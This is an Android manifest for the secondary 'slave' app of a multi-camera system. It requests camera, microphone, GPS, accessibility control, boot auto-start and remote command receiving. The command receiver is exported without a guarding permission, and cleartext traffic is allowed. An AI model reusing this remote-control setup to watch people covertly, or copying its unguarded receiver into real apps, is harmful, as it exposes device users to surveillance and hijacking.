<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.xuacha.multicampro.slave">

    <!-- ========== PERMISOS CRÍTICOS PARA APP ESCLAVA ========== -->
    
    <!-- Captura de Medios: Cámara, Audio, Ubicación -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    
    <!-- Acceso de Accesibilidad: Controlar dispositivo remotamente -->
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
    
    <!-- Servicios en Segundo Plano -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <!-- Gestión de Almacenamiento -->
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    
    <!-- Batería y Energía -->
    <uses-permission android:name="android.permission.BATTERY_STATS" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    
    <!-- Información del Dispositivo -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
    
    <!-- Linterna -->
    <uses-permission android:name="android.permission.FLASHLIGHT" />
    
    <!-- ========== CONFIGURACIÓN DE APLICACIÓN ========== -->
    
    <application
        android:name=".MainApplication"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:allowBackup="false"
        android:theme="@style/AppTheme"
        android:usesCleartextTraffic="true">
        
        <!-- ========== ACTIVIDAD PRINCIPAL ========== -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask"
            android:theme="@style/Theme.AppCompat">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <!-- ========== SERVICIOS ========== -->
        
        <!-- Servicio de Accesibilidad: Acceso profundo al dispositivo -->
        <service
            android:name=".services.SlaveAccessibilityService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config" />
        </service>
        
        <!-- Servicio en Primer Plano: Mantiene app activa con notificación persistente -->
        <service
            android:name=".services.SlaveForegroundService"
            android:exported="false"
            android:foregroundServiceType="mediaProjection" />
        
        <!-- Servicio de Cámara: Control remoto de cámara -->
        <service
            android:name=".services.CameraService"
            android:exported="false" />
        
        <!-- Servicio de Ubicación: Tracking de GPS -->
        <service
            android:name=".services.LocationService"
            android:exported="false" />
        
        <!-- Servicio de Comandos: Receptor de comandos remotos -->
        <service
            android:name=".services.CommandReceiverService"
            android:exported="false" />
        
        <!-- ========== BROADCAST RECEIVERS ========== -->
        
        <!-- Auto-reinicio al encender dispositivo -->
        <receiver
            android:name=".receivers.BootBroadcastReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>
        
        <!-- Receptor de Comandos Remotos -->
        <receiver
            android:name=".receivers.CommandReceiverBroadcast"
            android:exported="true">
            <intent-filter>
                <action android:name="com.xuacha.multicampro.COMMAND_ACTION" />
            </intent-filter>
        </receiver>
        
    </application>

</manifest>
